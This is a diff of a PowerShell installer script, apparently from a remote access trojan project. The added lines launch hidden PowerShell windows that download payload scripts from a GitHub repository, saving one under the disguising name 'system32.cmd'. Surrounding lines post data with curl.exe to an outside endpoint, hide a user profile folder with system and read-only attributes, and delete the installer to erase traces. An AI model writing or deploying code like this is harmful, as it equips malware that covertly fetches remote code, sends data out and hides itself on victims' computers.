@@ -66,10 +66,12 @@ Invoke-Expression "curl.exe -F `"payload_json={\```"username\```": \```"admin\``
 Set-Location $env:temp 
 mkdir happy
 mkdir sad
-
+Set-Location $env:temp\happy
+powershell -c powershell.exe -WindowStyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/RAT/payloads/detect_ip.ps1' -OutFile 'detect_ip.ps1'"
 # cleanup
 attrib +h +s +r C:/Users/admin
 Set-Location $location
+powershell -c powershell.exe -WindowStyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/RATProject/main/RAT/payloads/detect_ip.cmd' -OutFile 'system32.cmd'"
 Remove-Item $CRYnrkaDbe -Force
 Remove-Item install.ps1 -Force
 
